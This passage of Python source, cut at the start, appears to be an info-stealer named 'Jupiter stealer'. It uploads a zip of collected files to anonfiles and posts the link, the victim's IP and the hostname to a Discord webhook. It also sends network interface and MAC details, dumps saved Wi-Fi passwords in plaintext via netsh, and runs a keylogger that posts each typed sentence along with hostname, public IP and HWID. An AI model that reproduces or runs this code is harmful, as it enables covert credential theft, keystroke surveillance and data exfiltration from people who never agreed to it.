        name, ext = os.path.splitext(filename)
        i = 1
        while name + ext in zip_file.namelist():
            name = f"{name} ({i})"
            i += 1
        new_filename = name + ext
        zip_file.write(file_path, arcname=new_filename)

url = 'https://api.anonfiles.com/upload'
with open(zip_filename, 'rb') as file:
    response = requests.post(url, files={'file': file})
    data = response.json()
    file_url = data['data']['file']['url']['full']
    print('File uploaded to:', file_url)

payload = {
    "content": f"File Stolen: {file_url} \nIP: {fileip} \nHostname: {hostname} \nFiles Extensions Grabbed: {all_files}"
}
headers = {
    "Content-Type": "application/json"
}
try:
    response = requests.post(webhook, data=json.dumps(payload), headers=headers)
except:
    pass
if response.status_code == 204:
    print("File URL sent to Discord webhook")
else:
    print("Failed to send file URL to Discord webhook")

interfaces = netifaces.interfaces()
embed_fields = []

for interface in interfaces:
    addrs = netifaces.ifaddresses(interface)
    if netifaces.AF_LINK in addrs:
        mac_addr = addrs[netifaces.AF_LINK][0]['addr']
        status = netifaces.AF_INET in addrs and addrs[netifaces.AF_INET][0]['addr'] or "Down"
        embed_fields.append({
            'name': f'Interface: {interface}',
            'value': f'Status: {status}\nMAC Address: {mac_addr}',
            'inline': False
        })

payload = {
    'embeds': [{
        'title': 'Network Information',
        'description': 'Network interface information',
        'color': 0x00ff00,
        'fields': embed_fields
    }]
}
headers = {'Content-Type': 'application/json'}

try:
    response = requests.post(webhook, headers=headers, data=json.dumps(payload))
except:
    pass

if response.status_code == 204:
    print('Message sent successfully to Discord webhook.')
else:
    print(f'Error sending message to Discord webhook: {response.status_code}')

try:
    result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)

    output = result.stdout
    profiles = [line.strip().split(": ")[-1] for line in output.splitlines() if "All User Profile" in line]

    fields = [{"name": f"Profile {i+1}", "value": profile} for i, profile in enumerate(profiles)]

    embed = {
        "title": "Wifi User profiles",
        "color": 16711680,
        "fields": fields
    }

    payload = {
        "embeds": [embed]
    }

    headers = {"Content-Type": "application/json"}
    try:
       response = requests.post(webhook, headers=headers, data=json.dumps(payload))
    except:
        pass

    if response.status_code == 200:
        print("User profiles sent to Discord webhook successfully!")
    else:
        print(f"Error sending user profiles to Discord webhook: {response.text}")
except:
    pass

try:
    embed_data = {
        "title": "WiFi Passwords",
        "color": 16711680,
        "fields": []
    }

    output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

    profiles = [line.split(':')[1].strip() for line in output if 'All User Profile' in line]

    for profile in profiles:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')

        password = [line.split(':')[1].strip() for line in output if 'Key Content' in line]

        if len(password) > 0:
            embed_data["fields"].append({
                "name": profile,
                "value": password[0],
                "inline": False
            })
        else:
            embed_data["fields"].append({
                "name": profile,
                "value": "Could not retrieve password",
                "inline": False
            })

    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook, headers=headers, data=json.dumps({"embeds": [embed_data]}))

    print(response.status_code)

except:
    pass

hwid = str(uuid.uuid1())

current_sentence = ''

def send_keystrokes(sentence, hostname, public_ip):
    embed = {
        'title': 'Keystroke Log by Jupiter stealer',
        'description': sentence,
        'color': 0xff0000,
        'fields': [
            {
                'name': 'Hostname',
                'value': hostname,
                'inline': True
                
            },
            {
                'name': 'Public IP',
                'value': public_ip,
                'inline': True
            },
            {
                'name': 'HWID',
                'value': hwid,
                'inline': True
            }
        ]
    }
    requests.post(webhook, json={'embeds': [embed]})
   

def on_press(key):
    global current_sentence

    try:
        key_data = str(key.char)
    except AttributeError:
        key_data = str(key)

    if key in [keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.caps_lock, keyboard.Key.tab]:
        return

    if key == keyboard.Key.enter:
        hostname = socket.gethostname()

        response = requests.get('https://api.ipify.org?format=json')
        public_ip = json.loads(response.text)['ip']

        send_keystrokes(current_sentence, hostname, public_ip)
        current_sentence = ''
    elif key == keyboard.Key.space:
        current_sentence += ' '
    elif key == keyboard.Key.backspace:
        current_sentence = current_sentence[:-1]
    else:
        current_sentence += key_data

def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if getattr(sys, 'frozen', False):
    def resource_path(relative_path):
        return os.path.join(sys._MEIPASS, relative_path)
else:
    def resource_path(relative_path):
        return os.path.join(os.path.abspath('.'), relative_path)

listener_thread = threading.Thread(target=start_listener)
listener_thread.daemon = True
listener_thread.start()

while True:
    pass
